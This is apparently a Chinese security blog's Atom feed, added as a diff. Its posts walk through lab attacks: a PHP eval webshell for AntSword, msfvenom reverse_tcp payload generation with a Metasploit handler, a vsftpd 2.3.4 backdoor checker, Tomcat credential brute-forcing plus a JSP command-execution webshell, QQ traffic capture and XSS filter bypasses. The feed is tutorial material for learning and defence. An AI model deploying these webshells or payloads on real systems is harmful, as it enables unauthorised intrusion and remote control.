@@ -1,0 +1,279 @@
+<?xml version="1.0" encoding="utf-8"?>
+<feed xmlns="http://www.w3.org/2005/Atom">
+  <title>印星</title>
+  
+  <subtitle>印星</subtitle>
+  <link href="http://example.com/atom.xml" rel="self"/>
+  
+  <link href="http://example.com/"/>
+  <updated>2024-11-01T11:57:38.467Z</updated>
+  <id>http://example.com/</id>
+  
+  <author>
+    <name>印星</name>
+    
+  </author>
+  
+  <generator uri="https://hexo.io/">Hexo</generator>
+  
+  <entry>
+    <title>AntSword应用</title>
+    <link href="http://example.com/2024/10/24/%E8%9A%81%E5%89%91%E5%BA%94%E7%94%A8/"/>
+    <id>http://example.com/2024/10/24/%E8%9A%81%E5%89%91%E5%BA%94%E7%94%A8/</id>
+    <published>2024-10-24T11:20:23.000Z</published>
+    <updated>2024-11-01T11:57:38.467Z</updated>
+    
+    <content type="html"><![CDATA[<h2 id="一、AntSword介绍"><a href="#一、AntSword介绍" class="headerlink" title="一、AntSword介绍"></a>一、AntSword介绍</h2><p><a href="https://github.com/AntSwordProject/antSword.git">AntSword介绍与源码</a></p><h2 id="二、搭建网站并添加木马文件"><a href="#二、搭建网站并添加木马文件" class="headerlink" title="二、搭建网站并添加木马文件"></a>二、搭建网站并添加木马文件</h2><p>如果某个网站存在木马文件，我们就可以通过蚁剑进行连接<br>这里我用phpstudy在本地搭建的网站里添加木马文件进行演示<br>首先启动服务<br><img src="/img/AntSword/1.jpg"><br>在网站中管理点击根目录<br><img src="/img/AntSword/2.jpg"><br>在目录下新建shell.php并写入木马</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-keyword">eval</span>(<span class="hljs-variable">$_REQUEST</span>[<span class="hljs-string">&quot;AntSword&quot;</span>]);<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>访问<code>127.0.0.1/shell.php</code>,页面空白为正常<br><img src="/img/AntSword/3.jpg"></p><h2 id="三、AntSword连接与使用"><a href="#三、AntSword连接与使用" class="headerlink" title="三、AntSword连接与使用"></a>三、AntSword连接与使用</h2><p>打开AntSword，右键添加URL与连接密码<br><img src="/img/AntSword/4.jpg"><br>点击测试连接<br><img src="/img/AntSword/5.jpg"><br>点击添加<br><img src="/img/AntSword/6.jpg"><br>此时页面会存在数据右键后可以选择操作<br><img src="/img/AntSword/7.jpg"></p><h3 id="文件管理"><a href="#文件管理" class="headerlink" title="文件管理"></a>文件管理</h3><p>可以对网站内的文件进行操作<br><img src="/img/AntSword/8.jpg"></p><h3 id="数据操作"><a href="#数据操作" class="headerlink" title="数据操作"></a>数据操作</h3><p>对网站通过SQL语句执行数据操作<br><img src="/img/AntSword/9.jpg"></p><h3 id="其它"><a href="#其它" class="headerlink" title="其它"></a>其它</h3><p>还包括虚拟终端执行命令等等</p>]]></content>
+    
+    
+      
+      
+    <summary type="html">&lt;h2 id=&quot;一、AntSword介绍&quot;&gt;&lt;a href=&quot;#一、AntSword介绍&quot; class=&quot;headerlink&quot; title=&quot;一、AntSword介绍&quot;&gt;&lt;/a&gt;一、AntSword介绍&lt;/h2&gt;&lt;p&gt;&lt;a href=&quot;https://github.com/An</summary>
+      
+    
+    
+    
+    <category term="网络渗透" scheme="http://example.com/categories/%E7%BD%91%E7%BB%9C%E6%B8%97%E9%80%8F/"/>
+    
+    
+    <category term="网络渗透" scheme="http://example.com/tags/%E7%BD%91%E7%BB%9C%E6%B8%97%E9%80%8F/"/>
+    
+  </entry>
+  
+  <entry>
+    <title>Meterprete实现远控</title>
+    <link href="http://example.com/2024/10/24/Meterprete%E6%9C%A8%E9%A9%AC%E8%BF%9C%E6%8E%A7/"/>
+    <id>http://example.com/2024/10/24/Meterprete%E6%9C%A8%E9%A9%AC%E8%BF%9C%E6%8E%A7/</id>
+    <published>2024-10-24T08:36:35.000Z</published>
+    <updated>2024-11-01T11:57:10.290Z</updated>
+    
+    <content type="html"><![CDATA[<h2 id="一、Meterprete"><a href="#一、Meterprete" class="headerlink" title="一、Meterprete"></a>一、Meterprete</h2><p>Meterpreter是Metasploit Framework中的关键组件，它作为漏洞利用后的攻击载荷，提供纯内存工作模式，无需磁盘写入，且支持加密通信。Meterpreter允许进行进程迁移、密码哈希获取、权限提升等高级渗透测试操作。基本命令如进程迁移、系统信息收集和文件操作。</p><h2 id="二、恶意远控软件生成"><a href="#二、恶意远控软件生成" class="headerlink" title="二、恶意远控软件生成"></a>二、恶意远控软件生成</h2><p>工具：kali(攻击者)，windows11（被攻击者）</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">msfvenom -p 被攻击计算机系统（windows或者linux）/处理器体系结构（x64或者x32）/meterpreter/reverse_tcp lhost=攻击者的ip lport=设置端口号 -f exe -o 软件存放路径<br></code></pre></td></tr></table></figure><p>以上参数介绍</p><figure class="highlight crmsh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs crmsh">-p, --payload <span class="hljs-tag">&lt; payload&gt;</span> 指定需要使用的payload(攻击荷载)。可以使用自定义payload,几乎支持全平台的<br><br>-f, --format <span class="hljs-tag">&lt; format&gt;</span> 指定输出格式<br><br>-o, --out <span class="hljs-tag">&lt; path&gt;</span> 指定创建好的payload的存放位置<br><br>lhost, <span class="hljs-keyword">location</span> <span class="hljs-title">host</span> 本地ip<br><br>lport, <span class="hljs-keyword">location</span> <span class="hljs-title">port</span> 本地端口<br></code></pre></td></tr></table></figure><p><img src="/img/Meterprete/1.jpg"></p><h2 id="三、检测恶意软件"><a href="#三、检测恶意软件" class="headerlink" title="三、检测恶意软件"></a>三、检测恶意软件</h2><p>将生成软件放到<a href="https://habo.qq.com/">检测网站</a>检测测<br><img src="/img/Meterprete/2.jpg"></p><h2 id="四、远控步骤"><a href="#四、远控步骤" class="headerlink" title="四、远控步骤"></a>四、远控步骤</h2><p>1.kali中打开控制端</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs kali">msfconsole<br></code></pre></td></tr></table></figure><p>2.利用Meterpreter中的模块exploit&#x2F;mutil&#x2F;handler</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs msf6">use exploit/multi/handler<br></code></pre></td></tr></table></figure><p>3.设置相关配置（荷载，ip，端口等）<br><img src="/img/Meterprete/3.jpg"><br>4.在windows11中打开恶意软件<br>这里目录中存在main文件夹，里面我采访了一些内容，方便稍后测试<br><img src="/img/Meterprete/4.jpg"><br>5.返回kali中看到命令行出现变化，进行操作<br><img src="/img/Meterprete/5.jpg"><br><img src="/img/Meterprete/6.jpg"><br>入侵成功！</p><h2 id="五、Msfvenom相关参数"><a href="#五、Msfvenom相关参数" class="headerlink" title="五、Msfvenom相关参数"></a>五、Msfvenom相关参数</h2><figure class="highlight plaintext"><figcaption><span>--list <type> 列出指定模块的所有可用资源. 模块类型包括: payloads, encoders, nops,......all</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><code class="hljs -l,"> <br>-p, --payload &lt; payload&gt; 指定需要使用的payload(攻击荷载)。也可以使用自定义payload,几乎是支持全平台的<br> <br>-f, --format &lt; format&gt; 指定输出格式<br> <br>-e, --encoder &lt;encoder&gt; 指定需要使用的encoder（编码器），指定需要使用的编码，如果既没用-e选项也没用-b选项，则输出raw payload<br> <br>-a, --arch &lt; architecture&gt; 指定payload的目标架构，例如x86 还是 x64 还是 x86_64<br> <br>-o, --out &lt; path&gt; 指定创建好的payload的存放位置<br> <br>-b, --bad-chars &lt; list&gt; 设定规避字符集，指定需要过滤的坏字符。例如：不使用 &#x27;\x0f&#x27;、&#x27;\x00&#x27;<br> <br>-n, --nopsled &lt; length&gt; 为payload预先指定一个NOP滑动长度<br> <br>-s, --space &lt; length&gt; 设定有效攻击荷载的最大长度，就是文件大小<br> <br>-i, --iterations &lt; count&gt; 指定payload的编码次数<br> <br>-c, --add-code &lt; path&gt; 指定一个附加的win32 shellcode文件<br> <br>-x, --template &lt; path&gt; 指定一个自定义的可执行文件作为模板,并将payload嵌入其中<br> <br>-k, --keep 保护模板程序的动作，注入的payload作为一个新的进程运行<br> <br>-v, --var-name &lt; value&gt; 指定一个自定义的变量，以确定输出格式<br> <br>-t, --timeout &lt;second&gt; 从stdin读取有效负载时等待的秒数（默认为30，0表示禁用）<br> <br>-h,--help 查看帮助选项<br> <br>--platform &lt; platform&gt; 指定payload的目标平台<br></code></pre></td></tr></table></figure>]]></content>
+    
+    
+      
+      
+    <summary type="html">&lt;h2 id=&quot;一、Meterprete&quot;&gt;&lt;a href=&quot;#一、Meterprete&quot; class=&quot;headerlink&quot; title=&quot;一、Meterprete&quot;&gt;&lt;/a&gt;一、Meterprete&lt;/h2&gt;&lt;p&gt;Meterpreter是Metasploit Framewo</summary>
+      
+    
+    
+    
+    <category term="Web安全" scheme="http://example.com/categories/Web%E5%AE%89%E5%85%A8/"/>
+    
+    <category term="漏洞复现" scheme="http://example.com/categories/Web%E5%AE%89%E5%85%A8/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"/>
+    
+    
+    <category term="网络渗透" scheme="http://example.com/tags/%E7%BD%91%E7%BB%9C%E6%B8%97%E9%80%8F/"/>
+    
+  </entry>
+  
+  <entry>
+    <title>Python检测微笑漏洞</title>
+    <link href="http://example.com/2024/10/15/Python%E6%A3%80%E6%B5%8B%E5%BE%AE%E7%AC%91%E6%BC%8F%E6%B4%9E/"/>
+    <id>http://example.com/2024/10/15/Python%E6%A3%80%E6%B5%8B%E5%BE%AE%E7%AC%91%E6%BC%8F%E6%B4%9E/</id>
+    <published>2024-10-15T11:59:30.000Z</published>
+    <updated>2024-10-22T12:42:07.742Z</updated>
+    
+    <content type="html"><![CDATA[<h2 id="一、微笑漏洞介绍"><a href="#一、微笑漏洞介绍" class="headerlink" title="一、微笑漏洞介绍"></a>一、微笑漏洞介绍</h2><pre><code class="hljs">漏洞服务：VSFTPD 2.3.4，俗称笑脸漏洞。存在于这个2.3.4版本，属于开发者设计上的失误。在检测到用户名带有特殊字符`：）`时，会自动打开6200端口。</code></pre><h2 id="二、使用工具"><a href="#二、使用工具" class="headerlink" title="二、使用工具"></a>二、使用工具</h2><p>攻击机：kali linux<br>靶机：Metasploitable2</p><h2 id="三、检测过程"><a href="#三、检测过程" class="headerlink" title="三、检测过程"></a>三、检测过程</h2><h4 id="1-使用Nmap扫描同网段下的主机，得到靶机ip"><a href="#1-使用Nmap扫描同网段下的主机，得到靶机ip" class="headerlink" title="1.使用Nmap扫描同网段下的主机，得到靶机ip"></a>1.使用Nmap扫描同网段下的主机，得到靶机ip</h4><p><code>nmap 192.168.121.0/24</code><br><img src="/img/Python%E6%A3%80%E6%B5%8B%E5%BE%AE%E7%AC%91%E6%BC%8F%E6%B4%9E/1.png"></p><h4 id="2-在网上找到检测微笑漏洞的python脚本"><a href="#2-在网上找到检测微笑漏洞的python脚本" class="headerlink" title="2.在网上找到检测微笑漏洞的python脚本"></a>2.在网上找到检测微笑漏洞的python脚本</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs Python"><span class="hljs-keyword">import</span> socket<br><span class="hljs-keyword">from</span> ftplib <span class="hljs-keyword">import</span> FTP<br> <br>url = <span class="hljs-built_in">input</span>(<span class="hljs-string">&quot;请输入你需要检测的地址：&quot;</span>)<br>ftp = FTP()<br>username = <span class="hljs-string">&#x27;root:)&#x27;</span> <span class="hljs-comment">#用户名必须包含：)这两个字符</span><br>password = <span class="hljs-string">&#x27;anonymous&#x27;</span> <span class="hljs-comment">#密码随便啥都行</span><br><span class="hljs-keyword">try</span>:<br>    ftp.connect(url,<span class="hljs-number">21</span>,timeout=<span class="hljs-number">10</span>)<span class="hljs-comment">#使用ftp登录，设置延时10秒</span><br>    ftp.login(username,password)<br>    ftp.quit()<br><span class="hljs-keyword">except</span>:<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;完成登录检测&quot;</span>)<br><span class="hljs-keyword">try</span>:<br>    s = socket.socket() <span class="hljs-comment">#使用socket函数来检测是否有漏洞存在</span><br>    s.connect((url,<span class="hljs-number">6200</span>))<br>    s.close()<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;存在微笑漏洞&quot;</span>)<br><span class="hljs-keyword">except</span>:<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;没有发现笑脸漏洞！&quot;</span>)<br></code></pre></td></tr></table></figure><h4 id="3-kali运行并输入靶机ip"><a href="#3-kali运行并输入靶机ip" class="headerlink" title="3.kali运行并输入靶机ip"></a>3.kali运行并输入靶机ip</h4><p><img src="/img/Python%E6%A3%80%E6%B5%8B%E5%BE%AE%E7%AC%91%E6%BC%8F%E6%B4%9E/2.png"><br>检测成功</p>]]></content>
+    
+    
+      
+      
+    <summary type="html">&lt;h2 id=&quot;一、微笑漏洞介绍&quot;&gt;&lt;a href=&quot;#一、微笑漏洞介绍&quot; class=&quot;headerlink&quot; title=&quot;一、微笑漏洞介绍&quot;&gt;&lt;/a&gt;一、微笑漏洞介绍&lt;/h2&gt;&lt;pre&gt;&lt;code class=&quot;hljs&quot;&gt;漏洞服务：VSFTPD 2.3.4，俗称笑脸漏洞。</summary>
+      
+    
+    
+    
+    <category term="Web安全" scheme="http://example.com/categories/Web%E5%AE%89%E5%85%A8/"/>
+    
+    <category term="漏洞复现" scheme="http://example.com/categories/Web%E5%AE%89%E5%85%A8/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"/>
+    
+    
+    <category term="网络渗透" scheme="http://example.com/tags/%E7%BD%91%E7%BB%9C%E6%B8%97%E9%80%8F/"/>
+    
+  </entry>
+  
+  <entry>
+    <title>Tomcat漏洞复现</title>
+    <link href="http://example.com/2024/10/13/Tomcat%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"/>
+    <id>http://example.com/2024/10/13/Tomcat%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/</id>
+    <published>2024-10-13T13:32:27.000Z</published>
+    <updated>2024-10-14T11:57:22.542Z</updated>
+    
+    <content type="html"><![CDATA[<h2 id="一、Tomcat漏洞原理"><a href="#一、Tomcat漏洞原理" class="headerlink" title="一、Tomcat漏洞原理"></a>一、Tomcat漏洞原理</h2><pre><code class="hljs">Tomcat可以在后台部署War文件，默认的后台页面只允许在本地访问，如果内部技术人员手动配置允许其远程访问，在能得到后台管理账户和密码的情况下，攻击者可以上传木马图片，控制主机权限。</code></pre><h2 id="二、涉及版本"><a href="#二、涉及版本" class="headerlink" title="二、涉及版本"></a>二、涉及版本</h2><p>全版本</p><h2 id="三、漏洞复现条件"><a href="#三、漏洞复现条件" class="headerlink" title="三、漏洞复现条件"></a>三、漏洞复现条件</h2><p>1.后台管理页面允许远程访问<br>2.能拿到账户密码</p><h2 id="四、复现步骤-搭建容器过程省略"><a href="#四、复现步骤-搭建容器过程省略" class="headerlink" title="四、复现步骤(搭建容器过程省略)"></a>四、复现步骤(搭建容器过程省略)</h2><h3 id="（1）弱口令爆破账号密码"><a href="#（1）弱口令爆破账号密码" class="headerlink" title="（1）弱口令爆破账号密码"></a>（1）弱口令爆破账号密码</h3><p>1.进入Tomcat后台页面点击Manager APP,弹出登录框，需要账号密码<br><img src="/img/Tomcat/0.png"><br>2.我们使用msf进行爆破（也可使用bp抓包爆破，此处不演示）,进入开启kali的root权限，输入<code>msfconsole</code>调用msf工具<br><img src="/img/Tomcat/1.png"><br>3.输入<code>search tomcat</code>查询tomcat相关脚本工具<br><img src="/img/Tomcat/2.png"><br>4.发现mgr-longin，使用<code>use</code>指令调用该脚本,并输入<code>show options</code>查看配置并修改，这里我们修改目的IP<br><img src="/img/Tomcat/add.jpg"><br>5.<code>run</code>执行脚本爆破<br><img src="/img/Tomcat/4.png"><br>6、得到弱口令账号和密码为tomcat tomcat<br><img src="/img/Tomcat/5.png"></p><h3 id="（2）getshell"><a href="#（2）getshell" class="headerlink" title="（2）getshell"></a>（2）getshell</h3><p>1.输入密码进入后台部署页面<br><img src="/img/Tomcat/6.jpg"><br>2.编写jsp木马,命名为shell.jsp</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs Java">&lt;%<br>    <span class="hljs-keyword">if</span>(<span class="hljs-string">&quot;023&quot;</span>.equals(request.getParameter(<span class="hljs-string">&quot;pwd&quot;</span>)))&#123;<br>        java.io.<span class="hljs-type">InputStream</span> <span class="hljs-variable">in</span> <span class="hljs-operator">=</span> Runtime.getRuntime().exec(request.getParameter(<span class="hljs-string">&quot;i&quot;</span>)).getInputStream();<br>        <span class="hljs-type">int</span> <span class="hljs-variable">a</span> <span class="hljs-operator">=</span> -<span class="hljs-number">1</span>;<br>        <span class="hljs-type">byte</span>[] b = <span class="hljs-keyword">new</span> <span class="hljs-title class_">byte</span>[<span class="hljs-number">2048</span>];<br>        out.print(<span class="hljs-string">&quot;&lt;pre&gt;&quot;</span>);<br>        <span class="hljs-keyword">while</span>((a=in.read(b))!=-<span class="hljs-number">1</span>)&#123;<br>            out.println(<span class="hljs-keyword">new</span> <span class="hljs-title class_">String</span>(b));<br>        &#125;<br>        out.print(<span class="hljs-string">&quot;&lt;/pre&gt;&quot;</span>);<br>    &#125;<br>%&gt;<br></code></pre></td></tr></table></figure><p>脚本含义是当我们get传入pwd为023时，就会读取get传入数据i作为指令并将结果返回页面（也可以在网上搜寻支持蚁剑，冰蝎连接的脚本）<br>3.将jsp木马转为War文件形式,先进入shell.jsp所在目录</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">jar -cvf shell3.war shell.jsp<br></code></pre></td></tr></table></figure><p>在目录下就会生成shell3.war文件<br>4.将shell3.waf上传并部署<br><img src="/img/Tomcat/7.jpg"><br>5.访问<code>yourip/war文件名/jsp文件名.jsp</code>，出现空白页面则说明成功<br><img src="/img/Tomcat/8.png"><br>6.<code>?pwd=023&amp;i=ls</code>成功拿到权限<br><img src="/img/Tomcat/9.png"></p><h2 id="五、防范"><a href="#五、防范" class="headerlink" title="五、防范"></a>五、防范</h2><p>1.非必要禁止远程登录，或者限制访问的IP(只允许内部人员主机IP远程登录)<br>2.设置复杂的后台管理密码并定期更换</p>]]></content>
+    
+    
+      
+      
+    <summary type="html">&lt;h2 id=&quot;一、Tomcat漏洞原理&quot;&gt;&lt;a href=&quot;#一、Tomcat漏洞原理&quot; class=&quot;headerlink&quot; title=&quot;一、Tomcat漏洞原理&quot;&gt;&lt;/a&gt;一、Tomcat漏洞原理&lt;/h2&gt;&lt;pre&gt;&lt;code class=&quot;hljs&quot;&gt;Tomcat可以在</summary>
+      
+    
+    
+    
+    <category term="Web安全" scheme="http://example.com/categories/Web%E5%AE%89%E5%85%A8/"/>
+    
+    <category term="漏洞复现" scheme="http://example.com/categories/Web%E5%AE%89%E5%85%A8/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"/>
+    
+    
+    <category term="漏洞" scheme="http://example.com/tags/%E6%BC%8F%E6%B4%9E/"/>
+    
+  </entry>
+  
+  <entry>
+    <title>QQ流量分析</title>
+    <link href="http://example.com/2024/10/10/QQ%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/"/>
+    <id>http://example.com/2024/10/10/QQ%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/</id>
+    <published>2024-10-10T11:26:26.000Z</published>
+    <updated>2024-10-14T12:43:59.554Z</updated>
+    
+    <content type="html"><![CDATA[<h1 id="QQ流量分析"><a href="#QQ流量分析" class="headerlink" title="QQ流量分析"></a>QQ流量分析</h1><h2 id="一、测试条件："><a href="#一、测试条件：" class="headerlink" title="一、测试条件："></a>一、测试条件：</h2><p>两台设备处于同一个局域网下</p><h2 id="二、操作步骤"><a href="#二、操作步骤" class="headerlink" title="二、操作步骤"></a>二、操作步骤</h2><p>使用wireshark工具对局域网流量进行抓包,并查找qq账号来确定qq的流量包<br><img src="/img/qq%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/1.png"><br>可以看到wireshark成功抓到qq的数据包，并可以看到该版本qq使用的协议、源IP以及目标IP<br>接下来使用另外一台设备向开启抓包的设备发送一张.jpg图片<br><img src="/img/qq%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/0.png"><br>知道jpg文件头为ffd8，在wireshark使用十六进制查找<br><img src="/img/qq%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/2.png"><br>可以看到数据块中存在jfif字符，确定抓的包没问题，随后右键该包并选择追踪流，导出原始数据并命名为qq.jpg<br><img src="/img/qq%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/3.png"><br><img src="/img/qq%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/4.png"><br>直接打开看不了,因此我们将其用winhex打开<br><img src="/img/qq%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/5.png"><br>找到ffd8文件头，并将前面数据块删除，并保存覆盖原本的qq.jpg<br><img src="/img/qq%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/6.png"><br>此时直接打开就可以看到发送的图片了<br><img src="/img/qq%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/7.png"></p>]]></content>
+    
+    
+      
+      
+    <summary type="html">&lt;h1 id=&quot;QQ流量分析&quot;&gt;&lt;a href=&quot;#QQ流量分析&quot; class=&quot;headerlink&quot; title=&quot;QQ流量分析&quot;&gt;&lt;/a&gt;QQ流量分析&lt;/h1&gt;&lt;h2 id=&quot;一、测试条件：&quot;&gt;&lt;a href=&quot;#一、测试条件：&quot; class=&quot;headerlink&quot; ti</summary>
+      
+    
+    
+    
+    <category term="网络渗透" scheme="http://example.com/categories/%E7%BD%91%E7%BB%9C%E6%B8%97%E9%80%8F/"/>
+    
+    
+    <category term="网络渗透" scheme="http://example.com/tags/%E7%BD%91%E7%BB%9C%E6%B8%97%E9%80%8F/"/>
+    
+  </entry>
+  
+  <entry>
+    <title>xss注入</title>
+    <link href="http://example.com/2024/10/08/XSS%E6%B3%A8%E5%85%A5/"/>
+    <id>http://example.com/2024/10/08/XSS%E6%B3%A8%E5%85%A5/</id>
+    <published>2024-10-08T13:56:34.000Z</published>
+    <updated>2024-10-14T11:56:52.355Z</updated>
+    
+    <content type="html"><![CDATA[<h2 id="一、XSS漏洞基础概念"><a href="#一、XSS漏洞基础概念" class="headerlink" title="一、XSS漏洞基础概念"></a>一、XSS漏洞基础概念</h2><p>XSS——跨站脚本攻击（Cross-Site Scripting），简写本为css，但与层叠样式表（Cascading Style Sheets，CSS）重名，故改为XSS，通常是使用javascript将恶意代码插入前端网页，当用户使用这些网页时，这些被嵌入的恶意代码就会实施攻击。</p><h2 id="二、XSS漏洞本质"><a href="#二、XSS漏洞本质" class="headerlink" title="二、XSS漏洞本质"></a>二、XSS漏洞本质</h2><p>XSS漏洞本质就是将攻击者传递的数据直接或间接使用到前端javascript代码中运行。</p><h2 id="三、XSS类型"><a href="#三、XSS类型" class="headerlink" title="三、XSS类型"></a>三、XSS类型</h2><h3 id="XSS类型分为反射型、存储型以及DOM型"><a href="#XSS类型分为反射型、存储型以及DOM型" class="headerlink" title="XSS类型分为反射型、存储型以及DOM型"></a>XSS类型分为反射型、存储型以及DOM型</h3><h4 id="1-反射型XSS"><a href="#1-反射型XSS" class="headerlink" title="1.反射型XSS"></a>1.反射型XSS</h4><p>该类型特点为非持久化，一次性<br>原理：将恶意代码注入到URL中，如果服务器未对URL携带参数进行过滤，则用户在点击或者访问该链接时，服务器就会携带XSS恶意代码返回页面并执行，常用来窃取用户cookie，劫持流量、执行弹窗广告等。因类型特性攻击者需要诱导用户点击注入过的链接才能实施攻击<br>数据传输过程：攻击者浏览器-&gt;后端-&gt;用户浏览器</p><h4 id="2-存储型XSS"><a href="#2-存储型XSS" class="headerlink" title="2.存储型XSS"></a>2.存储型XSS</h4><p>该类型特点为持久化<br>原理：在服务器缺少对数据过滤的情况下，攻击者将恶意代码直接传输到服务器的数据库进行存储，在其他用户访问该服务器链接时，服务器就会携带XSS恶意代码返回用户页面并执行，与反射型相比，不需要诱导用户访问特定的链接，但目前对存储型XSS注入防范比较完备，因此使用率并没有反射型高<br>数据传输过程：攻击者浏览器—&gt;后端-&gt;数据库（存储）-&gt;后端-&gt;用户浏览器</p><h4 id="3-DOM型XSS"><a href="#3-DOM型XSS" class="headerlink" title="3.DOM型XSS"></a>3.DOM型XSS</h4><p>DOM了解：<a href="https://blog.csdn.net/wei1273356078/article/details/106543967">https://blog.csdn.net/wei1273356078/article/details/106543967</a><br>该类型与前两种类型XSS有本质区别，特点就是不需要经过后端，而是直接在网页执行<br>原理：攻击者的恶意数据直接在当前页面的javascript执行。</p><h2 id="四、XSS注入以及简单绕过"><a href="#四、XSS注入以及简单绕过" class="headerlink" title="四、XSS注入以及简单绕过"></a>四、XSS注入以及简单绕过</h2><h4 id="这里推荐练习场：https-xss-haozi-me"><a href="#这里推荐练习场：https-xss-haozi-me" class="headerlink" title="这里推荐练习场：https://xss.haozi.me/"></a>这里推荐练习场：<a href="https://xss.haozi.me/">https://xss.haozi.me/</a></h4><p>1.代码输出一个div的空标签，那我们可以直接用script来弹窗<br><img src="/img/xss%E6%B3%A8%E5%85%A5/1.jpg"></p><p>2.代码将输入数据传入input标签内value值，那我们可以将input闭合后进行弹窗，同时主要value的“<br><img src="/img/xss%E6%B3%A8%E5%85%A5/1.1.jpg"></p><p>3.代码过滤掉()后再将输入数据返回页面，那我们可以通过acill码、十六进制等编码进行绕过<br>（1）使用svg标签绕过，只要浏览器解析并加载了SVG标签，他的onload事件就会被触发。我们可以在后面用script标签内写代码作为onload事件<br><img src="/img/xss%E6%B3%A8%E5%85%A5/2.jpg"><br>其中&amp;#40与&amp;#41为acill码绕过()<br>（2）使用img标签绕过，src为图片路径，当无法找到该路径时就会触发onerror事件<br><img src="/img/xss%E6%B3%A8%E5%85%A5/3.jpg"><br>其中&amp;#x28与&amp;#x29为十六进制绕过()<br>（3）借助es6特性，Set.constructor：Set是JavaScript中的一个内置对象，用于存储任何类型的唯一值，这里的.constructor属性会返回Set构造函数本身。所以就是构造了函数并执行跟在后面的值<br><img src="/img/xss%E6%B3%A8%E5%85%A5/4.jpg"><br>在该题目中acill码与十六进制绕过可以替换</p><p>4.代码将我们输入的数据放入了注释符并输出，并且过滤了 –&gt;，但是注释符除去–&gt;来闭合外还能通过–!&gt;进行闭合后插入img标签<br><img src="/img/xss%E6%B3%A8%E5%85%A5/5.jpg"></p><p>5.代码将我们输入的数据放入输入框，并且将on开头&#x3D;号结尾的字符串过滤，我们可以借助html中换行不影响代码执行的特性，插入img标签弹窗<br><img src="/img/xss%E6%B3%A8%E5%85%A5/6.jpg"><br>除去此题另外一道类似的题目也使用换行输入的解法，用script标签弹窗<br><img src="/img/xss%E6%B3%A8%E5%85%A5/6.1.jpg"></p><p>6.代码将我们输入的数据放入了article标签，过滤掉了&gt;,但我们可以借助html中对最后一行不需要闭合也能执行的特性，插入img标签弹窗<br><img src="/img/xss%E6%B3%A8%E5%85%A5/7.jpg"></p>]]></content>
+    
+    
+      
+      
+    <summary type="html">&lt;h2 id=&quot;一、XSS漏洞基础概念&quot;&gt;&lt;a href=&quot;#一、XSS漏洞基础概念&quot; class=&quot;headerlink&quot; title=&quot;一、XSS漏洞基础概念&quot;&gt;&lt;/a&gt;一、XSS漏洞基础概念&lt;/h2&gt;&lt;p&gt;XSS——跨站脚本攻击（Cross-Site Scripting），</summary>
+      
+    
+    
+    
+    <category term="Web安全" scheme="http://example.com/categories/Web%E5%AE%89%E5%85%A8/"/>
+    
+    <category term="XSS注入" scheme="http://example.com/categories/Web%E5%AE%89%E5%85%A8/XSS%E6%B3%A8%E5%85%A5/"/>
+    
+    
+    <category term="web" scheme="http://example.com/tags/web/"/>
+    
